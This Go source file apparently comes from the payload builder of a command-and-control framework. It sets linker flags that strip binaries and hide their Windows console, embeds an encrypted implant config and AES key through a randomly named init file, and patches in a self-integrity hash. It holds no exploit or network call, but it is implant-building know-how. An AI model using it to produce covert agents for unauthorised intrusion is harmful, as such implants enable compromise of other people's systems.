package payload

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
)

// buildLdflags returns the linker flags for the agent build. The runtime config
// blob and its per-build AES key are NOT passed here: embedding them on the go
// build command line would expose the secrets in the build process's argv where
// other local users could read them via process enumeration (B2). Instead they
// are delivered through an ephemeral generated source file — see
// writeConfigInjectFile — so the returned values are (ldflags, configBlob,
// sConfigKey).
func buildLdflags(cfg ImplantConfig, profile MalleableProfile, goos string) (string, string, string) {
	blob, sConfigKey := buildConfigBlobKeyed(cfg, profile)

	flags := "-s -w -buildid="
	if goos == "windows" && !cfg.Debug {
		flags += " -H=windowsgui"
	}
	if cfg.SelfCheck {
		// Placeholder 64-char hex string, patched with the real binary SHA-256
		// after the build (see patchSelfCheckHash). The agent zeroes this exact
		// region before hashing so verification succeeds on the unmodified binary.
		flags += ` -X "main.SelfCheckSHA256Str=` + selfCheckPlaceholder + `"`
	}
	return flags, blob, sConfigKey
}

// writeConfigInjectFile writes an ephemeral Go source file into the agent build
// directory that sets the per-build runtime config blob and its AES key during
// package init(). Delivering secrets via this temp source file (instead of the
// go build argv) keeps them out of the build process command line (B2). The file
// lives only inside the throwaway build directory and is removed with it.
//
// The filename is randomized per build with an "aa_" prefix: Go runs a
// package's init() functions in source-file name order, and agent.go's init()
// calls loadConfigBlob() which reads ConfigBlob/SConfigKey. Any "aa_*" name
// sorts before "agent.go" ("aa" < "ag"), so the blob is always set before
// loadConfigBlob() executes, while the exact filename varies per build.
func writeConfigInjectFile(workDir, configBlob, sConfigKey string) error {
	if configBlob == "" && sConfigKey == "" {
		return nil
	}
	src := "package main\n\n// Code-generated at build time; do not edit.\nfunc init() {\n"
	if configBlob != "" {
		src += "\tConfigBlob = " + strconv.Quote(configBlob) + "\n"
	}
	if sConfigKey != "" {
		src += "\tSConfigKey = " + strconv.Quote(sConfigKey) + "\n"
	}
	src += "}\n"
	name := "aa_config_inject.go"
	if b := make([]byte, 3); func() bool { _, err := rand.Read(b); return err == nil }() {
		name = "aa_" + hex.EncodeToString(b) + "_inject.go"
	}
	return os.WriteFile(filepath.Join(workDir, name), []byte(src), 0644)
}

// patchSelfCheckHash computes the SHA-256 of the (already finalized) binary and
// overwrites the embedded selfCheckPlaceholder with that hash. The agent zeroes
// the embedded hash region before hashing, so a tampered binary fails the check.
// It must run AFTER every other post-build mutation (PE stripping, validation)
// so the embedded hash reflects the exact bytes the agent will read at runtime.
func patchSelfCheckHash(outPath string) error {
	if len(selfCheckPlaceholder) != 64 {
		return fmt.Errorf("internal: self-check placeholder is not 64 bytes")
	}
	data, err := os.ReadFile(outPath)
	if err != nil {
		return fmt.Errorf("read for self-check patch: %w", err)
	}
	idx := bytes.Index(data, []byte(selfCheckPlaceholder))
	if idx < 0 {
		return fmt.Errorf("self-check placeholder not found in built binary")
	}
	sum := sha256.Sum256(data)
	real := hex.EncodeToString(sum[:])
	if len(real) != 64 {
		return fmt.Errorf("internal: computed self-check hash is not 64 bytes")
	}
	copy(data[idx:idx+64], []byte(real))
	if err := os.WriteFile(outPath, data, 0755); err != nil {
		return fmt.Errorf("write self-check patch: %w", err)
	}
	return nil
}
